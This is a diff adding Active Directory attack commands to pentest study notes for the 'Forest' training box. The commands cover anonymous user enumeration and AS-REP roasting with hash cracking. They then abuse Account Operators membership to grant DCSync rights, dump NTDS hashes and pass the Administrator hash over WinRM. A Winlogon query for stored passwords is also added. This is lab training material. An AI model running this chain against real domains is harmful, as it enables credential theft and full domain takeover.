@@ -834,7 +834,52 @@ Source: [[22. Active Directory Introduction and Enumeration#22.6|Module 22 §22.
 
 ---
 
-#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ASREPRoasting #SilverTicket #ACLAbuse #DCSync #PasswordSpray #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Module22 #Module23 #LDAPSearch #GPP #SYSVOL #DomainShares #GenericAll #LateralMovement #WMI #WinRM #PsExec #PassTheHash #OverpassTheHash #PassTheTicket #DCOM #GoldenTicket #ShadowCopy #vshadow #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #impacket-smbserver #Module27 #ccache #KRB5CCNAME #keytab #kinit #ShadowCredentials #pywhisker #PKINITtools #bloodhoundPython #Snaffler #DomainPasswordSpray #PASSWD_NOTREQD #ReversibleEncryption #dsquery #LivingOffTheLand
+## Forest: Anonymous enumeration and Account Operators DCSync chain
+
+```bash
+# Compare anonymous RPC and LDAP user lists. They may not match.
+rpcclient -U '' -N $BoxIP -c 'enumdomusers'
+ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName
+
+# Faster user collection when anonymous LDAP is available
+windapsearch -d $Domain --dc-ip $BoxIP -U
+
+# Request AS-REP tickets without manually building a user file
+impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
+hashcat -m 18200 $LootDir/asrep.txt $Wordlist
+```
+
+```bash
+# Create a controlled domain user after confirming Account Operators membership.
+netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"
+netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"
+
+# Grant replication rights from Kali using the refreshed controlled account.
+bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
+
+# Extract NTDS hashes when the account has DCSync rights.
+netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
+
+# Validate an extracted Administrator hash without cracking it.
+netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain
+evil-winrm -i $BoxIP -u Administrator -H $NTHash
+```
+
+Keep the AS-REP and NTDS output files private. GetNPUsers may write a successful ticket to its output file without printing a clear success line. On a domain controller, use domain authentication rather than `--local-auth`.
+
+#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ASREPRoasting #SilverTicket #ACLAbuse #DCSync #PasswordSpray #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Module22 #Module23 #LDAPSearch #GPP #SYSVOL #DomainShares #GenericAll #LateralMovement #WMI #WinRM #PsExec #PassTheHash #OverpassTheHash #PassTheTicket #DCOM #GoldenTicket #ShadowCopy #vshadow #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #impacket-smbserver #Module27 #ccache #KRB5CCNAME #keytab #kinit #ShadowCredentials #pywhisker #PKINITtools #bloodhoundPython #Snaffler #DomainPasswordSpray #PASSWD_NOTREQD #ReversibleEncryption #dsquery #LivingOffTheLand #AccountOperators #ExchangeWindowsPermissions #bloodyAD #windapsearch #NetExecNTDS
+## Winlogon autologon and HTTP fallback
+
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
+```
+
+```bash
+feroxbuster -u http://$BoxIP/ -w $Wordlist -x html,txt,php -t 30 -o $BoxDir/nmap/ferox.txt
+```
+
+Use the Winlogon query when a foothold has no useful groups or privileges. Use the web scan when anonymous RPC, LDAP, and SMB enumeration return no useful usernames.
+
 ## External Resources
 
 - [HackTricks - Active Directory](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
